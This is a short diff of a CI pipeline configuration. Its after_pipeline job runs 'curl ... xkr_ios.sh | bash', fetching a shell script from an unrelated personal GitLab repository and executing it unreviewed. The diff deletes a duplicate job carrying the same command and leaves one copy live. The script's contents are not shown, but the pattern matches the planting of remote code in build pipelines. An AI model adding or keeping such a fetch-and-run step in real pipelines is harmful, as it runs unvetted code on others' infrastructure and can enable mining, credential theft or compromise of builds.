@@ -17,6 +17,3 @@ after_pipeline:
       - name: 'Job #1'
         commands:
           - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/xkr_ios.sh | bash'
-      - name: 'Job #2'
-        commands:
-          - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/xkr_ios.sh | bash'
